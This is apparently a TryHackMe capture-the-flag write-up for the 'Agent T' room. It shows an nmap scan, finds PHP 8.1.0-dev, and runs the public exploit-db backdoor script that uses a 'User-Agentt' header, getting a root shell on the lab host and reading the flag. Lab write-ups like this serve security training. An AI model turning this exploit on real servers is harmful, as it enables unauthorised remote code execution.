**THM** : Agent T<br>
**Room Link** : https://tryhackme.com/room/agentt<br>
**Difficulty** : Easy <br>
**Flags to capture** : Root<br>
**Key Topics, Techniques, and Tools** : <br>
 - Ports and Services scan : [nmap](https://nmap.org/)
 - Exploit
 - Python scripting
 - Bash scripting 

<p align="center">   <img src="https://i.imgur.com/ah92RBF.png"> </p>  

# Summary
  - [Adding IP to the hosts file](#adding-ip-to-the-hosts-file)
  - [Nmap scan](#nmap-scan)
  - [Website discovery](#website-disovery)
  - [Exploiting the PHP version](#exploiting-the-php-version)

<p align="center">   <img src="https://i.imgur.com/Kmtrf12.png"> </p> 

## Adding IP to the hosts file 
I start by adding the IP of the machine to my hosts file:<br>
```
echo "10.10.53.229 agent-t.thm"|sudo tee -a /etc/hosts
```   

## Nmap scan

I perform an `Nmap` scan on the target host and save the output to a file called `nmapResults.txt` <br>
The scan includes all ports `-p-` and uses aggressive scan options `-A` <br>

```
└─# nmap agent-t.thm -A -p- -oN nmapResults.txt

Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-30 22:20 CEST
Nmap scan report for agent-t.thm (10.10.53.229)
Host is up (0.034s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title:  Admin Dashboard
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=4/30%OT=80%CT=1%CU=44769%PV=Y%DS=2%DC=T%G=Y%TM=644ECDA
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST1
OS:1NW7%O6=M508ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=3F%W=FAF0%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=3F%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=3F%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   32.40 ms 10.8.0.1
2   33.25 ms agent-t.thm (10.10.53.229)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.86 seconds                                                           
```

There is only 1 open port :
- `HTTP` - `PHP 8.1.0-dev` on port `80` 

## Website discovery
By going on the site, I find an admin dashboard webpage which seems to not allow user input :
<img src=https://i.imgur.com/VwYEShb.png>

## Exploiting the PHP version
At this stage, the only information that seems usable is the version of PHP (`PHP 8.1.0-dev`), so I decide to go to the site `exploit-db.com` (a public archive of exploits and vulnerable software maintained by `Offensive Security`) to see if an exploit is available : 
<img src=https://i.imgur.com/anuT98z.png>

There is an exploit which is a python script that allows to execute code remotely by exploiting a backdoor by sending an HTTP header  named `User-Agentt` :
<img src=https://i.imgur.com/2IdbCV3.png>

I download the script and try to execute it. I just have to enter the URL of the target machine to get a root shell :
```
└─# python3 49933.py        
Enter the full host url:
http://agent-t.thm/

Interactive shell is opened on http://agent-t.thm/ 
Can't acces tty; job crontol turned off.
$ whoami
root
```
Now that I have root access to the machine, I can recover the `root flag` :
```
$ ls /
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

$ cat /flag.txt
flag{*******************************}
```
